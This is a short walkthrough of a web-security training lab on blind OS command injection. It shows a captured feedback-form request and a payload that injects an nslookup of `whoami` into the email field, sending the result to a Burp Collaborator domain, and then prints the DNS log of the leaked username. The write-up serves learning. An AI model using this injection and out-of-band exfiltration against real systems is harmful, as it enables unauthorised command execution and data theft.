# 4. Blind OS command injection with out-of-band data exfiltration

**Goal** : retrieve user using whoami command using Burp Collaborator

**Steps** : 

- submit the feedback form, u will get an endpoint of /feedback/submit

```jsx
POST /feedback/submit HTTP/2
Host: 0a17009003fcba558221f63f00f200aa.web-security-academy.net
Cookie: session=xhr0GPPxAFPg9EbZy4fnyYmxFb71nYS8
Content-Length: 112
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a17009003fcba558221f63f00f200aa.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a17009003fcba558221f63f00f200aa.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

csrf=M4SZIJYZLNFojsQp08JQjqVSjNePn1pe&name=nothng&email=hackkk%40gmail.com&subject=Super&message=kolkata
```

- send this in repeater, and check every parameter by input **;ls;**
    - u can see there is no unique response in any parameter 😢
    - Now we are going to use Burp collaborator 😈 below payloads are :
    - 
    
    ```jsx
    %3bnslookup+`whoami`.d1f1h8agetitcc99dr21jf3s2j8bw1kq.oastify.com%3b
    
    here -> %3b -> ; 
    ```
    
- full payload are :

```jsx
csrf=M4SZIJYZLNFojsQp08JQjqVSjNePn1pe&name=nothng&email=hackkk%40gmail.com%3bnslookup+`whoami`.d1f1h8agetitcc99dr21jf3s2j8bw1kq.oastify.com%3b&subject=Super&message=kolkata
```

- Send and check in collaborator.
- in Burp Collaborator :

```
The Collaborator server received a DNS lookup of type A for the domain name **peter-ABLIaz**.d1f1h8agetitcc99dr21jf3s2j8bw1kq.oastify.com.  The lookup was received from IP address 3.251.120.113:18921 at 2026-Mar-08 15:39:30.943 UTC.
```

LAB SOLVED.